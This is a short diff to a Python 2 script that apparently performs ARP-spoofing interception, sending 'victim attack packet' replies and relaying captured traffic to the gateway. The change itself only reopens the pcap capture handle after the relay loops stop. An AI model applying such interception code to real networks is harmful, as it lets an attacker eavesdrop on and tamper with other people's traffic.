@@ -39,6 +39,7 @@ def reply_to_request(infection_reply):
                 print '[<+] Sent victim attack packet'
 
         print 'relaying ip stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
 
 
 def relay_ip():
@@ -55,7 +56,9 @@ def relay_ip():
             relaying_packet.destination_mac = gateway_mac
             pcap_handle.sendpacket(relaying_packet.as_bytes())
             print '[<!]sent relay.'
+
         print 'relaying ip stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
 
 
 def main():
